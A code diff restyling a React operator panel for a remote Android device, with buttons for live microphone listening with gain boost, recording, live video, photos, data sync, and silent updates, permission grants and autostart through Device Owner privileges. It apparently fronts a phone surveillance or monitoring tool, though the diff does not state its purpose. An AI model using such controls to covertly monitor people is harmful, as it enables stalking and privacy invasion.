@@ -10,63 +10,51 @@ type ControlButtonsProps = {
   isCameraLive?: boolean
 }
 
-type ButtonConfig = {
-  label: string
-  cmd: string
-  extra?: Record<string, unknown>
-  color: 'green' | 'teal' | 'yellow' | 'red' | 'gray' | 'blue' | 'purple' | 'orange'
-  icon?: string
-  activeColor?: 'green' | 'teal' | 'yellow' | 'red' | 'gray' | 'blue' | 'purple' | 'orange'
-  isActive?: boolean
-  category: 'audio' | 'camera' | 'settings' | 'system'
-  tooltip?: string
-}
-
-const colorClasses: Record<string, string> = {
-  green: 'bg-emerald-600 hover:bg-emerald-500 border-emerald-500 text-white',
-  teal: 'bg-teal-600 hover:bg-teal-500 border-teal-500 text-white',
-  yellow: 'bg-yellow-600 hover:bg-yellow-500 border-yellow-500 text-black',
-  red: 'bg-red-600 hover:bg-red-500 border-red-500 text-white',
-  gray: 'bg-slate-700 hover:bg-slate-600 border-slate-600 text-slate-200',
-  blue: 'bg-blue-600 hover:bg-blue-500 border-blue-500 text-white',
-  purple: 'bg-purple-600 hover:bg-purple-500 border-purple-500 text-white',
-  orange: 'bg-orange-600 hover:bg-orange-500 border-orange-500 text-white',
-}
-
 const GAIN_LEVELS = [
-  { label: '1x Normal', value: 1.0, color: 'gray' as const },
-  { label: '1.5x Boost', value: 1.5, color: 'blue' as const },
-  { label: '2x Loud', value: 2.0, color: 'green' as const },
-  { label: '3x Max', value: 3.0, color: 'orange' as const },
-  { label: '4x Ultra', value: 4.0, color: 'red' as const },
+  { label: '1× Normal', value: 1.0, color: '#64748b', bg: 'rgba(100,116,139,0.15)' },
+  { label: '1.5× Boost', value: 1.5, color: '#60a5fa', bg: 'rgba(96,165,250,0.15)' },
+  { label: '2× Loud',   value: 2.0, color: '#10b981', bg: 'rgba(16,185,129,0.15)' },
+  { label: '3× Max',    value: 3.0, color: '#f59e0b', bg: 'rgba(245,158,11,0.15)' },
+  { label: '4× Ultra',  value: 4.0, color: '#ef4444', bg: 'rgba(239,68,68,0.15)' },
 ]
 
-export function ControlButtons({ 
-  onCommand, 
+const VOICE_PROFILES = ['near', 'room', 'far'] as const
+type VoiceProfile = typeof VOICE_PROFILES[number]
+const VOICE_ICONS: Record<VoiceProfile, string> = { near: '🎙', room: '🔊', far: '📢' }
+const VOICE_COLORS: Record<VoiceProfile, { color: string; bg: string; border: string }> = {
+  near:  { color: '#60a5fa', bg: 'rgba(96,165,250,0.18)',  border: 'rgba(96,165,250,0.4)' },
+  room:  { color: '#a5b4fc', bg: 'rgba(99,102,241,0.15)',  border: 'rgba(99,102,241,0.4)' },
+  far:   { color: '#fbbf24', bg: 'rgba(245,158,11,0.18)',  border: 'rgba(245,158,11,0.4)' },
+}
+
+const NIGHT_MODES = ['off', '1s', '3s', '5s'] as const
+type NightMode = typeof NIGHT_MODES[number]
+const NIGHT_LABELS: Record<NightMode, string> = { off: 'Night: Off', '1s': 'Night: Low', '3s': 'Night: Med', '5s': 'Night: High' }
+
+export function ControlButtons({
+  onCommand,
   health,
   isStreaming = false,
   isRecording = false,
   isWebRtcActive = false,
   isCameraLive = false,
 }: ControlButtonsProps) {
-  const [voiceProfile, setVoiceProfile] = useState<'near' | 'room' | 'far'>(
-    (health?.voiceProfile as 'near' | 'room' | 'far') || 'room'
+  const [voiceProfile, setVoiceProfile] = useState<VoiceProfile>(
+    (health?.voiceProfile as VoiceProfile) || 'room'
   )
-  const [photoNight, setPhotoNight] = useState<'off' | '1s' | '3s' | '5s'>(
-    (health?.photoNight as 'off' | '1s' | '3s' | '5s') || 'off'
+  const [photoNight, setPhotoNight] = useState<NightMode>(
+    (health?.photoNight as NightMode) || 'off'
   )
   const [gainIndex, setGainIndex] = useState(0)
 
   const cycleVoiceProfile = () => {
-    const profiles: Array<'near' | 'room' | 'far'> = ['near', 'room', 'far']
-    const next = profiles[(profiles.indexOf(voiceProfile) + 1) % profiles.length]
+    const next = VOICE_PROFILES[(VOICE_PROFILES.indexOf(voiceProfile) + 1) % VOICE_PROFILES.length]
     setVoiceProfile(next)
     onCommand('voice_profile', { profile: next })
   }
 
   const cyclePhotoNight = () => {
-    const modes: Array<'off' | '1s' | '3s' | '5s'> = ['off', '1s', '3s', '5s']
-    const next = modes[(modes.indexOf(photoNight) + 1) % modes.length]
+    const next = NIGHT_MODES[(NIGHT_MODES.indexOf(photoNight) + 1) % NIGHT_MODES.length]
     setPhotoNight(next)
     onCommand('photo_night', { mode: next })
   }
@@ -77,151 +65,203 @@ export function ControlButtons({
     onCommand('set_gain', { level: GAIN_LEVELS[nextIndex].value })
   }
 
-  const currentGain = GAIN_LEVELS[gainIndex]
-
-  const buttons: ButtonConfig[] = [
-    // Audio Controls
-    {
-      label: isStreaming ? '⏹ Stop Listen' : '🎧 Live Listen',
-      cmd: isStreaming ? 'stop_stream' : 'start_stream',
-      color: isStreaming ? 'red' : 'green',
-      category: 'audio',
-    },
-    {
-      label: isWebRtcActive ? '📡 WebRTC Stop' : '📡 WebRTC',
-      cmd: isWebRtcActive ? 'webrtc_stop' : 'webrtc_start',
-      color: isWebRtcActive ? 'gray' : 'teal',
-      category: 'audio',
-    },
-    {
-      label: isRecording ? '⏹ Stop Record' : '⏺ Record',
-      cmd: isRecording ? 'stop_record' : 'start_record',
-      color: isRecording ? 'gray' : 'red',
-      category: 'audio',
-    },
-    {
-      label: `🗣 Voice: ${voiceProfile.charAt(0).toUpperCase() + voiceProfile.slice(1)}`,
-      cmd: 'cycle_voice',
-      color: voiceProfile === 'far' ? 'yellow' : 'gray',
-      category: 'audio',
-    },
-    {
-      label: `🔊 Gain: ${currentGain.label}`,
-      cmd: 'cycle_gain',
-      color: currentGain.color,
-      category: 'audio',
-      tooltip: 'Cycle through volume gain levels (1x → 1.5x → 2x → 3x → 4x)',
-    },
-
-    // Camera Controls
-    {
-      label: isCameraLive ? '📺 Stop Video' : '📺 Live Video',
-      cmd: isCameraLive ? 'camera_live_stop' : 'camera_live_start',
-      color: isCameraLive ? 'red' : 'blue',
-      category: 'camera',
-    },
-    {
-      label: '📷 Take Photo',
-      cmd: 'take_photo',
-      color: 'blue',
-      category: 'camera',
-    },
-    {
-      label: '🔁 Switch Camera',
-      cmd: 'switch_camera',
-      color: 'gray',
-      category: 'camera',
-    },
-    {
-      label: `🌙 Night: ${photoNight === 'off' ? 'OFF' : photoNight === '1s' ? 'LOW' : photoNight === '3s' ? 'MED' : 'HIGH'}`,
-      cmd: 'cycle_night',
-      color: photoNight !== 'off' ? 'purple' : 'gray',
-      category: 'camera',
-    },
-
-    // System Controls
-    {
-      label: '📥 Sync Data',
-      cmd: 'get_data',
-      color: 'blue',
-      category: 'system',
-    },
-    {
-      label: '⬆️ Force Update',
-      cmd: 'force_update',
-      color: 'purple',
-      category: 'system',
-      tooltip: 'Prompt user on device to install update (Silent if Device Owner)',
-    },
-    {
-      label: '🔐 Grant Permissions',
-      cmd: 'grant_permissions',
-      color: 'purple',
-      category: 'system',
-      tooltip: 'Requires Android Device Owner privileges',
-    },
-    {
-      label: '🚀 Enable Autostart',
-      cmd: 'enable_autostart',
-      color: 'orange',
-      category: 'system',
-      tooltip: 'Requires Android Device Owner privileges',
-    },
-  ]
-
-  const handleClick = (btn: ButtonConfig) => {
-    if (btn.cmd === 'cycle_voice') {
-      cycleVoiceProfile()
-      return
-    }
-    if (btn.cmd === 'cycle_night') {
-      cyclePhotoNight()
-      return
-    }
-    if (btn.cmd === 'cycle_gain') {
-      cycleGain()
-      return
-    }
-    onCommand(btn.cmd, btn.extra)
-  }
-
-  const audioButtons = buttons.filter(b => b.category === 'audio')
-  const cameraButtons = buttons.filter(b => b.category === 'camera')
-  const systemButtons = buttons.filter(b => b.category === 'system')
-
-  const renderButtons = (btns: ButtonConfig[]) => (
-    <div className="flex flex-wrap gap-1.5">
-      {btns.map((btn) => (
-        <button
-          key={btn.cmd + btn.label}
-          onClick={() => handleClick(btn)}
-          title={btn.tooltip}
-          className={`
-            inline-flex items-center gap-1 px-2.5 py-1.5 text-xs font-medium rounded
-            border transition-all duration-150 whitespace-nowrap
-            ${colorClasses[btn.color]}
-          `}
-        >
-          {btn.label}
-        </button>
-      ))}
-    </div>
-  )
+  const gain = GAIN_LEVELS[gainIndex]
+  const vc = VOICE_COLORS[voiceProfile]
 
   return (
-    <div className="space-y-3">
-      <div>
-        <div className="text-[10px] uppercase tracking-wider text-slate-500 mb-1.5">Audio</div>
-        {renderButtons(audioButtons)}
-      </div>
-      <div>
-        <div className="text-[10px] uppercase tracking-wider text-slate-500 mb-1.5">Camera</div>
-        {renderButtons(cameraButtons)}
-      </div>
-      <div>
-        <div className="text-[10px] uppercase tracking-wider text-slate-500 mb-1.5">System</div>
-        {renderButtons(systemButtons)}
-      </div>
+    <div className="space-y-4">
+      {/* ── Audio ──────────────────────────────────────────────────────── */}
+      <section>
+        <SectionHead icon="🎙" label="Audio" />
+        <div className="grid grid-cols-2 gap-2">
+          {/* Live Listen */}
+          <BigBtn
+            icon={isStreaming ? '⏹' : '🎧'}
+            label={isStreaming ? 'Stop Listen' : 'Live Listen'}
+            onClick={() => onCommand(isStreaming ? 'stop_stream' : 'start_stream')}
+            active={isStreaming}
+            activeColor="rgba(16,185,129,0.2)"
+            activeBorder="rgba(16,185,129,0.4)"
+            activeText="#34d399"
+            inactiveColor="rgba(16,185,129,0.1)"
+            inactiveBorder="rgba(16,185,129,0.25)"
+            inactiveText="#6ee7b7"
+          />
+          {/* WebRTC */}
+          <BigBtn
+            icon="📡"
+            label={isWebRtcActive ? 'Stop WebRTC' : 'WebRTC'}
+            onClick={() => onCommand(isWebRtcActive ? 'webrtc_stop' : 'webrtc_start')}
+            active={isWebRtcActive}
+            activeColor="rgba(96,165,250,0.2)"
+            activeBorder="rgba(96,165,250,0.4)"
+            activeText="#60a5fa"
+            inactiveColor="rgba(20,184,166,0.1)"
+            inactiveBorder="rgba(20,184,166,0.25)"
+            inactiveText="#5eead4"
+          />
+          {/* Record */}
+          <BigBtn
+            icon={isRecording ? '⏹' : '⏺'}
+            label={isRecording ? 'Stop Rec' : 'Record'}
+            onClick={() => onCommand(isRecording ? 'stop_record' : 'start_record')}
+            active={isRecording}
+            activeColor="rgba(239,68,68,0.2)"
+            activeBorder="rgba(239,68,68,0.4)"
+            activeText="#f87171"
+            inactiveColor="rgba(239,68,68,0.08)"
+            inactiveBorder="rgba(239,68,68,0.2)"
+            inactiveText="#fca5a5"
+          />
+          {/* Voice Profile */}
+          <button
+            onClick={cycleVoiceProfile}
+            className="rounded-xl px-3 py-3 flex flex-col items-center gap-1 transition-all duration-200 text-center"
+            style={{
+              background: vc.bg, border: `1px solid ${vc.border}`, color: vc.color,
+              boxShadow: `0 0 16px ${vc.bg}`
+            }}
+          >
+            <span className="text-xl">{VOICE_ICONS[voiceProfile]}</span>
+            <span className="text-[10px] font-bold uppercase tracking-wider">
+              Voice: {voiceProfile.charAt(0).toUpperCase() + voiceProfile.slice(1)}
+            </span>
+          </button>
+        </div>
+
+        {/* Gain slider-style row */}
+        <button
+          onClick={cycleGain}
+          className="w-full mt-2 rounded-xl px-4 py-2.5 flex items-center justify-between gap-3 transition-all duration-200"
+          style={{
+            background: gain.bg, border: `1px solid ${gain.color}40`, color: gain.color
+          }}
+        >
+          <span className="text-base">🔊</span>
+          <span className="text-xs font-bold flex-1 text-left">
+            Gain: {gain.label}
+          </span>
+          {/* Visual gain meter */}
+          <div className="flex items-end gap-0.5 h-4">
+            {GAIN_LEVELS.map((_, i) => (
+              <div key={i} className="w-1.5 rounded-sm transition-all duration-300" style={{
+                height: `${4 + i * 20}%`,
+                background: i <= gainIndex ? gain.color : `${gain.color}25`,
+                minHeight: '4px',
+              }} />
+            ))}
+          </div>
+          <span className="text-[10px] opacity-60">TAP TO CYCLE</span>
+        </button>
+      </section>
+
+      {/* ── Camera ──────────────────────────────────────────────────────── */}
+      <section>
+        <SectionHead icon="📷" label="Camera" />
+        <div className="grid grid-cols-2 gap-2">
+          <BigBtn
+            icon={isCameraLive ? '📺' : '📺'}
+            label={isCameraLive ? 'Stop Video' : 'Live Video'}
+            onClick={() => onCommand(isCameraLive ? 'camera_live_stop' : 'camera_live_start')}
+            active={isCameraLive}
+            activeColor="rgba(239,68,68,0.2)"
+            activeBorder="rgba(239,68,68,0.4)"
+            activeText="#f87171"
+            inactiveColor="rgba(96,165,250,0.1)"
+            inactiveBorder="rgba(96,165,250,0.25)"
+            inactiveText="#93c5fd"
+          />
+          <SmallBtn icon="📷" label="Take Photo" onClick={() => onCommand('take_photo')} color="#60a5fa" />
+          <SmallBtn icon="🔁" label="Switch Cam" onClick={() => onCommand('switch_camera')} color="#94a3b8" />
+          <SmallBtn
+            icon="🌙"
+            label={NIGHT_LABELS[photoNight]}
+            onClick={cyclePhotoNight}
+            color={photoNight !== 'off' ? '#a78bfa' : '#64748b'}
+            active={photoNight !== 'off'}
+          />
+        </div>
+      </section>
+
+      {/* ── System ──────────────────────────────────────────────────────── */}
+      <section>
+        <SectionHead icon="⚙️" label="System" />
+        <div className="grid grid-cols-2 gap-2">
+          <SmallBtn icon="📥" label="Sync Data" onClick={() => onCommand('get_data')} color="#60a5fa" />
+          <SmallBtn icon="⬆️" label="Force Update" onClick={() => onCommand('force_update')} color="#a78bfa" tooltip="Silent if Device Owner" />
+          <SmallBtn icon="🔐" label="Grant Perms" onClick={() => onCommand('grant_permissions')} color="#a78bfa" tooltip="Requires Device Owner" />
+          <SmallBtn icon="🚀" label="Autostart" onClick={() => onCommand('enable_autostart')} color="#f97316" tooltip="Requires Device Owner" />
+        </div>
+      </section>
     </div>
+  )
+}
+
+// ── Sub-components ─────────────────────────────────────────────────────────────
+
+function SectionHead({ icon, label }: { icon: string; label: string }) {
+  return (
+    <div className="flex items-center gap-2 mb-2">
+      <span className="text-sm">{icon}</span>
+      <span className="text-[10px] uppercase tracking-widest font-bold text-slate-500">{label}</span>
+      <span className="flex-1 h-px" style={{ background: 'rgba(255,255,255,0.05)' }} />
+    </div>
+  )
+}
+
+function BigBtn({
+  icon, label, onClick, active,
+  activeColor, activeBorder, activeText,
+  inactiveColor, inactiveBorder, inactiveText
+}: {
+  icon: string; label: string; onClick: () => void; active: boolean
+  activeColor: string; activeBorder: string; activeText: string
+  inactiveColor: string; inactiveBorder: string; inactiveText: string
+}) {
+  const bg = active ? activeColor : inactiveColor
+  const border = active ? activeBorder : inactiveBorder
+  const color = active ? activeText : inactiveText
+
+  return (
+    <button
+      onClick={onClick}
+      className="rounded-xl px-3 py-3 flex flex-col items-center gap-1 transition-all duration-200"
+      style={{ background: bg, border: `1px solid ${border}`, color,
+               boxShadow: active ? `0 0 20px ${activeColor}` : 'none' }}
+      onMouseEnter={e => { (e.currentTarget as HTMLElement).style.transform = 'scale(1.02)' }}
+      onMouseLeave={e => { (e.currentTarget as HTMLElement).style.transform = 'scale(1)' }}
+    >
+      <span className="text-xl">{icon}</span>
+      <span className="text-[10px] font-bold uppercase tracking-wider text-center leading-tight">{label}</span>
+    </button>
+  )
+}
+
+function SmallBtn({ icon, label, onClick, color, active = false, tooltip }: {
+  icon: string; label: string; onClick: () => void; color: string
+  active?: boolean; tooltip?: string
+}) {
+  return (
+    <button
+      onClick={onClick}
+      title={tooltip}
+      className="rounded-xl px-3 py-2.5 flex items-center gap-2 text-left transition-all duration-200 w-full"
+      style={{
+        background: active ? `${color}22` : 'rgba(255,255,255,0.04)',
+        border: `1px solid ${active ? `${color}50` : 'rgba(255,255,255,0.07)'}`,
+        color: active ? color : '#94a3b8',
+      }}
+      onMouseEnter={e => {
+        (e.currentTarget as HTMLElement).style.background = `${color}18`
+        ;(e.currentTarget as HTMLElement).style.color = color
+      }}
+      onMouseLeave={e => {
+        (e.currentTarget as HTMLElement).style.background = active ? `${color}22` : 'rgba(255,255,255,0.04)'
+        ;(e.currentTarget as HTMLElement).style.color = active ? color : '#94a3b8'
+      }}
+    >
+      <span className="text-base">{icon}</span>
+      <span className="text-xs font-semibold">{label}</span>
+    </button>
   )
 }
